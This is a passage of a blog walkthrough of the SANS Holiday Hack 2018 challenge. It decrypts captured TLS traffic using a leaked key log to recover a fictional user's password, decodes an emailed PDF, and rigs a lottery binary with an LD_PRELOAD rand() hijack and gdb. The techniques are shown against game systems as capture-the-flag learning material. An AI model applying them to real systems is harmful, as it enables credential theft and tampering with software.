&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; curl &lt;span class="s1"&gt;&amp;#39;https://packalyzer.kringlecastle.com/DEV/packalyzer_clientrandom_ssl.log&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;CLIENT_RANDOM D5DFF2B39A827877C64457B9F246A2BC05869EDA679F2167692ACB36480AABB4 B6B4C39A3161566566E6291030EDEBA1F91511B8513F07CBE4A159022F497A1AEB18821887B51FDC1764F2219DEFC001&lt;/span&gt;
&lt;span class="go"&gt;CLIENT_RANDOM BBEE641A4FB1B77D8D23FE324649B02E30B024BEA322D61CC77F2A1A5A6423C7 6289BBAFD1DF5C23CCC68C6E579D71E1D18416F2D0CEB05351E10A7C27A22FEDC66221C33DFCC908490C0EBBF9BF8F97&lt;/span&gt;
&lt;span class="go"&gt;CLIENT_RANDOM 1C7E42420FBC79D157D86366DB1907CEC1D27343893647AF60D72CD4913825FE AEBC249465A01BA3A8D30E1FEB665CA0128A4F1BAC14D809F1B1F6F38F7B2423FFBC45E1402CA65E8B746174716F9B89&lt;/span&gt;
&lt;span class="go"&gt;CLIENT_RANDOM 0E21203AE0707D515D46EF381CB7E04729110B18BF8DBE8EE8C6AA2D7F1A3742 C3461766C26A9209F1F248C4C7FA9A5E588A9E7933697D7F586D3380B187A344B04EB41C9232207008E54D9E4EAF53F8&lt;/span&gt;
&lt;span class="go"&gt;CLIENT_RANDOM 2E6C446BACF3F740DA5DFB31BC922138C49B13C6DD522C770F81339D0582085A 90E48FE08378BB0E6569CB27547E8AAF724726289AE86188483A8C4D7B76A52DCA0598BBD8FF78E5F70CFDEA02208859&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Awesome, we get the SSL secrets of the webserver. We can use this to decrypt
our sniffed traffic. Here's what we'll do:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;We'll sniff 20 seconds of traffic.&lt;/li&gt;
&lt;li&gt;We'll quickly download the SSl secrets file, because it will most likely
contain the secrets for our sniffed traffic.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a class="reference external" href="/docs/sans-christmas-challenge-2018/31002530_14-1-2019_9-57-43.pcap"&gt;Here&lt;/a&gt;'s
my capture file, and &lt;a class="reference external" href="/docs/sans-christmas-challenge-2018/packalyzer_clientrandom_ssl.log"&gt;here&lt;/a&gt;'s
my SSL secrets file. Now, let's open up Wireshark, so that we can decrypt the
traffic. I found &lt;a class="reference external" href="https://lekensteyn.nl/files/wireshark-ssl-decryption.pdf#page=11"&gt;these slides&lt;/a&gt;
that explain how you can configure Wireshark to use our SSL secrets:&lt;/p&gt;
&lt;img alt="packalyzer_wireshark_http2_decrypted.png" class="align-center" src="/images/sans-christmas-challenge-2018/packalyzer_wireshark_http2_decrypted.png" /&gt;
&lt;p&gt;Awesome, we now have decrypted the HTTP/2 traffic to the website. If we look
around, we see a login request:&lt;/p&gt;
&lt;img alt="packalyzer_wireshark_password.png" class="align-center" src="/images/sans-christmas-challenge-2018/packalyzer_wireshark_password.png" /&gt;
&lt;p&gt;We found Alabaster's password to the packalyzer,
&lt;code&gt;alabaster:Packer-p&amp;#64;re-turntable192&lt;/code&gt;. Let's connect to the web site with
these credentials, and see what capture files he has accessible:&lt;/p&gt;
&lt;img alt="packalyzer_alabaster_login.png" class="align-center" src="/images/sans-christmas-challenge-2018/packalyzer_alabaster_login.png" /&gt;
&lt;p&gt;Hmmm, &lt;code&gt;super_secret_packet_capture.pcap&lt;/code&gt;, sounds interesting! You can
download it &lt;a class="reference external" href="/docs/sans-christmas-challenge-2018/super_secret_packet_capture.pcap"&gt;here&lt;/a&gt;.
Let's open it in Wireshark:&lt;/p&gt;
&lt;img alt="packalyzer_wireshark_smtp.png" class="align-center" src="/images/sans-christmas-challenge-2018/packalyzer_wireshark_smtp.png" /&gt;
&lt;p&gt;We can see some SMTP traffic. Let's follow the TCP stream to get a clearer
picture:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;220 mail.kringlecastle.com ESMTP Postfix (Ubuntu)
EHLO Mail.kringlecastle.com
250-mail.kringlecastle.com
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN

MAIL FROM:&amp;lt;Holly.evergreen@mail.kringlecastle.com&amp;gt;
250 2.1.0 Ok
RCPT TO:&amp;lt;alabaster.snowball@mail.kringlecastle.com&amp;gt;
250 2.1.5 Ok
DATA
354 End data with &amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;
Date: Fri, 28 Sep 2018 11:33:17 -0400
To: alabaster.snowball@mail.kringlecastle.com
From: Holly.evergreen@mail.kringlecastle.com
Subject: test Fri, 28 Sep 2018 11:33:17 -0400
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary=&amp;quot;----=_MIME_BOUNDARY_000_11181&amp;quot;

------=_MIME_BOUNDARY_000_11181
Content-Type: text/plain

Hey alabaster,

&lt;span class="hll"&gt;Santa said you needed help understanding musical notes for accessing the vault. He said your favorite key was D. Anyways, the following attachment should give you all the information you need about transposing music.
&lt;/span&gt;
------=_MIME_BOUNDARY_000_11181
Content-Type: application/octet-stream
Content-Transfer-Encoding: BASE64
Content-Disposition: attachment

JVBERi0xLjUKJb/3ov4KOCAwIG9iago8PCAvTGluZWFyaXplZCAxIC9MIDk3ODMxIC9IIFsgNzM4
IDE0MCBdIC9PIDEyIC9FIDc3MzQ0IC9OIDIgL1QgOTc1MTcgPj4KZW5kb2JqCiAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKOSAwIG9iago8PCAv
[snip]
2zMAAFMTA30KZW5kc3RyZWFtCmVuZG9iagogICAgICAgICAgICAgICAgICAgICAgICAgICAgIApz
dGFydHhyZWYKMjE2CiUlRU9GCg==

------=_MIME_BOUNDARY_000_11181--


.

250 2.0.0 Ok: queued as 4CF931B5C3C0
QUIT
221 2.0.0 Bye
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We get a mail from Molly Evergreen with an attached document that explains
&lt;a class="reference external" href="https://en.wikipedia.org/wiki/Transposition_(music)"&gt;music transposition&lt;/a&gt;.
Let's copy/paste the base64 encoded document and decode it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; base64 -d &amp;lt; attachment.b64 &amp;gt; attachment
&lt;span class="gp"&gt;$&lt;/span&gt; file attachment
&lt;span class="go"&gt;attachment: PDF document, version 1.5&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; mv attachment music_transposition.pdf
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We get a &lt;a class="reference external" href="/docs/sans-christmas-challenge-2018/music_transposition.pdf"&gt;PDF file&lt;/a&gt;.
Here's what it says:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A piano keyboard gives us easy access to every (western) tone. As we go
from left to right, the pitches get higher. Pressing the middle A, for
example, would give us a tone of 440 Hertz. Pressing the next A up (to the
right) gives us 880 Hz, while the next one down (left) produces 220 Hz.
These A tones each sound very similar to us - just higher and lower. Each A
is an &amp;quot;octave&amp;quot; apart from the next. Going key by key, we count 12 &amp;quot;half
tone&amp;quot; steps between one A and the next - 12 steps in an octave.&lt;/p&gt;
&lt;p&gt;As you may have guessed, elf (and human) ears perceive pitches
logarithmically. That is, the frequency jump between octaves doubles as we
go up the keyboard, and that sounds normal to us. Consequently, the precise
frequency of each note other than A can only be cleanly expressed with a
log base 12 expression. Ugh! For our purposes though, we can think of note
separation in terms of whole and half steps.&lt;/p&gt;
&lt;p&gt;Have you noticed the black keys on the keyboard? They represent half steps
between the white keys. For example, the black key between C and D is
called C# (c-sharp) or Db (d-flat). Going from C to D is a whole step, but
either is a half step from C#/Db. Some white keys don’t have black ones
between them. B &amp;amp; C and E &amp;amp; F are each only a half step apart. Why? Well,
it turns out that our ears like it that way. Try this: press C D E F G A B
C on a piano. It sounds natural, right? The &amp;quot;C major&amp;quot; scale you just played
matches every other major scale:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;whole step from C to D&lt;/li&gt;
&lt;li&gt;whole step from D to E&lt;/li&gt;
&lt;li&gt;half step from E to F&lt;/li&gt;
&lt;li&gt;whole step from F to G&lt;/li&gt;
&lt;li&gt;Whole step from G to A&lt;/li&gt;
&lt;li&gt;Whole step from A to B, and finally&lt;/li&gt;
&lt;li&gt;Half step from B to C&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you follow that same pattern (whole whole half whole whole whole half),
you can start from any note on the keyboard and play a major scale. So a Bb
major scale would be Bb C D Eb F G A Bb. You can get this by counting whole
and half steps up from Bb or by taking each note in the C major scale and
going down a whole step.&lt;/p&gt;
&lt;p&gt;This uniform shifting of tones is called transposition. This is done all
the time in music because of differences in how instruments are designed,
the sound an arranger wants to achieve, or the comfortable vocal range of a
singer. Some elves can do this on the fly without really thinking, but it
can always be done manually, looking at a piano keyboard.&lt;/p&gt;
&lt;p&gt;To look at it another way, consider a song &amp;quot;written in the key of Bb.&amp;quot; If
the musicians don’t like that key, it can be transposed to A with a little
thought. First, how far apart are Bb and A? Looking at our piano, we see
they are a half step apart. OK, so for each note, we’ll move down one half
step. Here’s an original in Bb:&lt;/p&gt;
&lt;p&gt;D C Bb C D D D C C C D F F D C Bb C D D D D C C D C Bb&lt;/p&gt;
&lt;p&gt;And take everything down one half step for A:&lt;/p&gt;
&lt;p&gt;C# B A B C# C# C# B B B C# E E C# B A B C# C# C# C# B B C# B A&lt;/p&gt;
&lt;p&gt;We’ve just taken Mary Had a Little Lamb from Bb to A!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So, the song in the document is &amp;quot;Mary Had a Little Lamb&amp;quot;!&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="ransomware-recovery"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id36"&gt;Ransomware Recovery&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="shiny-upatree-s-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id37"&gt;Shiny Upatree's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We must win Shiny Upatree's lottery.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;I&amp;#39;ll hear the bells on Christmas Day&lt;/span&gt;
&lt;span class="go"&gt;Their sweet, familiar sound will play&lt;/span&gt;
&lt;span class="go"&gt;  But just one elf,&lt;/span&gt;
&lt;span class="go"&gt;  Pulls off the shelf,&lt;/span&gt;
&lt;span class="go"&gt;The bells to hang on Santa&amp;#39;s sleigh!&lt;/span&gt;
&lt;span class="go"&gt;Please call me Shinny Upatree&lt;/span&gt;
&lt;span class="go"&gt;I write you now, &amp;#39;cause I would be&lt;/span&gt;
&lt;span class="go"&gt;  The one who gets -&lt;/span&gt;
&lt;span class="go"&gt;  Whom Santa lets&lt;/span&gt;
&lt;span class="go"&gt;The bells to hang on Santa&amp;#39;s sleigh!&lt;/span&gt;
&lt;span class="go"&gt;But all us elves do want the job,&lt;/span&gt;
&lt;span class="go"&gt;Conveying bells through wint&amp;#39;ry mob&lt;/span&gt;
&lt;span class="go"&gt;  To be the one&lt;/span&gt;
&lt;span class="go"&gt;  Toy making&amp;#39;s done&lt;/span&gt;
&lt;span class="go"&gt;The bells to hang on Santa&amp;#39;s sleigh!&lt;/span&gt;
&lt;span class="go"&gt;To make it fair, the Man devised&lt;/span&gt;
&lt;span class="go"&gt;A fair and simple compromise.&lt;/span&gt;
&lt;span class="go"&gt;  A random chance,&lt;/span&gt;
&lt;span class="go"&gt;  The winner dance!&lt;/span&gt;
&lt;span class="go"&gt;The bells to hang on Santa&amp;#39;s sleigh!&lt;/span&gt;
&lt;span class="go"&gt;Now here I need your hacker skill.&lt;/span&gt;
&lt;span class="go"&gt;To be the one would be a thrill!&lt;/span&gt;
&lt;span class="go"&gt;  Please do your best,&lt;/span&gt;
&lt;span class="go"&gt;  And rig this test&lt;/span&gt;
&lt;span class="go"&gt;The bells to hang on Santa&amp;#39;s sleigh!&lt;/span&gt;
&lt;span class="go"&gt;Complete this challenge by winning the sleighbell lottery for Shinny Upatree.&lt;/span&gt;
&lt;span class="gp"&gt;elf@04895b80b092:~$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, let's see this lottery:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@04895b80b092:~$&lt;/span&gt; ls
&lt;span class="go"&gt;gdb  objdump  sleighbell-lotto&lt;/span&gt;
&lt;span class="gp"&gt;elf@04895b80b092:~$&lt;/span&gt; ./sleighbell-lotto
&lt;span class="go"&gt;The winning ticket is number 1225.&lt;/span&gt;
&lt;span class="go"&gt;Rolling the tumblers to see what number you&amp;#39;ll draw...&lt;/span&gt;
&lt;span class="go"&gt;You drew ticket number 4526!&lt;/span&gt;
&lt;span class="go"&gt;Sorry - better luck next year!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Hmm, let's try again:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@04895b80b092:~$&lt;/span&gt; ./sleighbell-lotto
&lt;span class="go"&gt;The winning ticket is number 1225.&lt;/span&gt;
&lt;span class="go"&gt;Rolling the tumblers to see what number you&amp;#39;ll draw...&lt;/span&gt;
&lt;span class="go"&gt;You drew ticket number 9478!&lt;/span&gt;
&lt;span class="go"&gt;Sorry - better luck next year!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, we draw a random number, and we're supposed to get 1225.&lt;/p&gt;
&lt;div class="section" id="id1"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id38"&gt;Yannick's (dirty) solution&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;If you remember, we had a similar challenge in &lt;a class="reference external" href="/posts/2018/01/10/sans-christmas-challenge-2017/#id14"&gt;last year's Holiday Hack&lt;/a&gt;. We can create a
fake C library and then use the &lt;a class="reference external" href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win"&gt;LD_PRELOAD&lt;/a&gt;
trick to change the behaviour of the &lt;code&gt;rand&lt;/code&gt; function. Let's check that
the &lt;code&gt;sleighbell-lotto&lt;/code&gt; uses &lt;code&gt;rand&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@04895b80b092:~$&lt;/span&gt; ./objdump -d ./sleighbell-lotto  &lt;span class="p"&gt;|&lt;/span&gt; grep -i rand
&lt;span class="go"&gt;00000000000009a0 &amp;lt;srand@plt&amp;gt;:&lt;/span&gt;
&lt;span class="go"&gt; 9a0:   ff 25 0a 76 20 00       jmpq   *0x20760a(%rip)        # 207fb0 &amp;lt;srand@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;00000000000009c0 &amp;lt;rand@plt&amp;gt;:&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt; 9c0:   ff 25 fa 75 20 00       jmpq   *0x2075fa(%rip)        # 207fc0 &amp;lt;rand@GLIBC_2.2.5&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;    1505:       e8 96 f4 ff ff          callq  9a0 &amp;lt;srand@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;    1520:       e8 9b f4 ff ff          callq  9c0 &amp;lt;rand@plt&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, it seems to do so. Let's create our fake library. Trouble is, there's
no &lt;code&gt;gcc&lt;/code&gt; on the elf terminal. So let's generate this library on our own
computer, and then copy it to the elf terminal:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; cat hijack_rand.c
&lt;span class="go"&gt;int rand()&lt;/span&gt;
&lt;span class="go"&gt;{&lt;/span&gt;
&lt;span class="go"&gt;    return 1225;&lt;/span&gt;
&lt;span class="go"&gt;}&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; gcc -o hijack_rand.so -shared -fPIC ./hijack_rand.c
&lt;span class="gp"&gt;$&lt;/span&gt; base64 ./hijack_rand.so
&lt;span class="go"&gt;f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAoAQAAAAAAABAAAAAAAAAABAXAAAAAAAAAAAAAEAAOAAH&lt;/span&gt;
&lt;span class="go"&gt;AEAAGAAXAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAYAAAAAAAA0BgAAAAAAAAAA&lt;/span&gt;
&lt;span class="go"&gt;IAAAAAAAAQAAAAYAAACADgAAAAAAAIAOIAAAAAAAgA4gAAAAAACgAQAAAAAAAKgBAAAAAAAAAAAg&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAACAAAABgAAAJAOAAAAAAAAkA4gAAAAAACQDiAAAAAAAFABAAAAAAAAUAEAAAAAAAAIAAAA&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAQAAAAEAAAAyAEAAAAAAADIAQAAAAAAAMgBAAAAAAAAJAAAAAAAAAAkAAAAAAAAAAQAAAAA&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, let's copy the base64 in the elf terminal:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@04895b80b092:~$&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAoAQAAAAAAABAAAAAAAAAABAXAAAAAAAAAAAAAEAAOAAH&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt; AEAAGAAXAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAYAAAAAAAA0BgAAAAAAAAAA&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt; IAAAAAAAAQAAAAYAAACADgAAAAAAAIAOIAAAAAAAgA4gAAAAAACgAQAAAAAAAKgBAAAAAAAAAAAg&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt; AAAAAAACAAAABgAAAJAOAAAAAAAAkA4gAAAAAACQDiAAAAAAAFABAAAAAAAAUAEAAAAAAAAIAAAA&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt; [snip]&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt; CAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAANAUAAAAAAAAfAEAAAAAAAAA&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt; AAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAABMFgAAAAAAAMMA&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt; AAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA&amp;quot;&lt;/span&gt; &amp;gt; ./hijack_rand.so.b64
&lt;span class="gp"&gt;elf@bb438504d48c:~$&lt;/span&gt; base64 -d &amp;lt; ./hijack_rand.so.b64 &amp;gt; ./hijack_rand.so
&lt;span class="gp"&gt;elf@bb438504d48c:~$&lt;/span&gt; &lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;./hijack_rand.so&amp;quot;&lt;/span&gt; ./sleighbell-lotto
&lt;span class="go"&gt;The winning ticket is number 1225.&lt;/span&gt;
&lt;span class="go"&gt;Rolling the tumblers to see what number you&amp;#39;ll draw...&lt;/span&gt;
&lt;span class="go"&gt;You drew ticket number 1225!&lt;/span&gt;

&lt;span class="go"&gt;                                                     .....          ......&lt;/span&gt;
&lt;span class="go"&gt;                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......&lt;/span&gt;
&lt;span class="go"&gt;                             .&amp;#39;;:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........&lt;/span&gt;
&lt;span class="go"&gt;                         &amp;#39;:okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........&lt;/span&gt;
&lt;span class="go"&gt;                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........&lt;/span&gt;
&lt;span class="go"&gt;                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........&lt;/span&gt;
&lt;span class="go"&gt;                &amp;#39;lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......&lt;/span&gt;
&lt;span class="go"&gt;              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;&lt;/span&gt;
&lt;span class="go"&gt;          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;&lt;/span&gt;
&lt;span class="go"&gt;       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc&lt;/span&gt;
&lt;span class="go"&gt;     ...................,&amp;#39;,,:lxkkkkkkkkkkkkkd.&lt;/span&gt;
&lt;span class="go"&gt;     ..........................&amp;#39;;;:coxkkkkk:&lt;/span&gt;
&lt;span class="go"&gt;        ...............................ckd.&lt;/span&gt;
&lt;span class="go"&gt;          ...............................&lt;/span&gt;
&lt;span class="go"&gt;                ...........................&lt;/span&gt;
&lt;span class="go"&gt;                   .......................&lt;/span&gt;
&lt;span class="go"&gt;                              ....... ...&lt;/span&gt;
&lt;span class="go"&gt;With gdb you fixed the race.&lt;/span&gt;
&lt;span class="go"&gt;The other elves we did out-pace.&lt;/span&gt;
&lt;span class="go"&gt;  And now they&amp;#39;ll see.&lt;/span&gt;
&lt;span class="go"&gt;  They&amp;#39;ll all watch me.&lt;/span&gt;
&lt;span class="go"&gt;I&amp;#39;ll hang the bells on Santa&amp;#39;s sleigh!&lt;/span&gt;
&lt;span class="go"&gt;Congratulations! You&amp;#39;ve won, and have successfully completed this challenge.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="id2"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id39"&gt;The &amp;quot;official&amp;quot; solution&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;As we can see from the congratulation message, and the fact that &lt;code&gt;gdb&lt;/code&gt; is
present on the elf shell, the official way to solve this challenge is to use
&lt;code&gt;gdb&lt;/code&gt;. So, let's load the lottery program in &lt;code&gt;gdb&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@2ba77dc8fde8:~$&lt;/span&gt; ./gdb -q ./sleighbell-lotto
&lt;span class="go"&gt;Reading symbols from ./sleighbell-lotto...(no debugging symbols found)...done.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) disas main&lt;/span&gt;
&lt;span class="go"&gt;Dump of assembler code for function main:&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000014ca &amp;lt;+0&amp;gt;:     push   %rbp&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000014cb &amp;lt;+1&amp;gt;:     mov    %rsp,%rbp&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000014ce &amp;lt;+4&amp;gt;:     sub    $0x10,%rsp&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000014d2 &amp;lt;+8&amp;gt;:     lea    0x56d6(%rip),%rdi        # 0x6baf&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000014d9 &amp;lt;+15&amp;gt;:    callq  0x970 &amp;lt;getenv@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000014de &amp;lt;+20&amp;gt;:    test   %rax,%rax&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000014e1 &amp;lt;+23&amp;gt;:    jne    0x14f9 &amp;lt;main+47&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000014e3 &amp;lt;+25&amp;gt;:    lea    0x56d6(%rip),%rdi        # 0x6bc0&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000014ea &amp;lt;+32&amp;gt;:    callq  0x910 &amp;lt;puts@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000014ef &amp;lt;+37&amp;gt;:    mov    $0xffffffff,%edi&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000014f4 &amp;lt;+42&amp;gt;:    callq  0x920 &amp;lt;exit@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000014f9 &amp;lt;+47&amp;gt;:    mov    $0x0,%edi&lt;/span&gt;
&lt;span class="go"&gt;   0x00000000000014fe &amp;lt;+52&amp;gt;:    callq  0x9e0 &amp;lt;time@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001503 &amp;lt;+57&amp;gt;:    mov    %eax,%edi&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001505 &amp;lt;+59&amp;gt;:    callq  0x9a0 &amp;lt;srand@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x000000000000150a &amp;lt;+64&amp;gt;:    lea    0x583f(%rip),%rdi        # 0x6d50&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001511 &amp;lt;+71&amp;gt;:    callq  0x910 &amp;lt;puts@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001516 &amp;lt;+76&amp;gt;:    mov    $0x1,%edi&lt;/span&gt;
&lt;span class="go"&gt;   0x000000000000151b &amp;lt;+81&amp;gt;:    callq  0x960 &amp;lt;sleep@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001520 &amp;lt;+86&amp;gt;:    callq  0x9c0 &amp;lt;rand@plt&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001525 &amp;lt;+91&amp;gt;:    mov    %eax,%ecx&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001527 &amp;lt;+93&amp;gt;:    mov    $0x68db8bad,%edx&lt;/span&gt;
&lt;span class="go"&gt;   0x000000000000152c &amp;lt;+98&amp;gt;:    mov    %ecx,%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001516 &amp;lt;+76&amp;gt;:    mov    $0x1,%edi&lt;/span&gt;
&lt;span class="go"&gt;   0x000000000000152e &amp;lt;+100&amp;gt;:   imul   %edx&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001530 &amp;lt;+102&amp;gt;:   sar    $0xc,%edx&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001533 &amp;lt;+105&amp;gt;:   mov    %ecx,%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001535 &amp;lt;+107&amp;gt;:   sar    $0x1f,%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001538 &amp;lt;+110&amp;gt;:   sub    %eax,%edx&lt;/span&gt;
&lt;span class="go"&gt;   0x000000000000153a &amp;lt;+112&amp;gt;:   mov    %edx,%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x000000000000153c &amp;lt;+114&amp;gt;:   mov    %eax,-0x4(%rbp)&lt;/span&gt;
&lt;span class="go"&gt;   0x000000000000153f &amp;lt;+117&amp;gt;:   mov    -0x4(%rbp),%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001542 &amp;lt;+120&amp;gt;:   imul   $0x2710,%eax,%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x0000000000001548 &amp;lt;+126&amp;gt;:   sub    %eax,%ecx&lt;/span&gt;
&lt;span class="go"&gt;   0x000000000000154a &amp;lt;+128&amp;gt;:   mov    %ecx,%eax&lt;/span&gt;
&lt;span class="go"&gt;   0x000000000000154c &amp;lt;+130&amp;gt;:   mov    %eax,-0x4(%rbp)&lt;/span&gt;
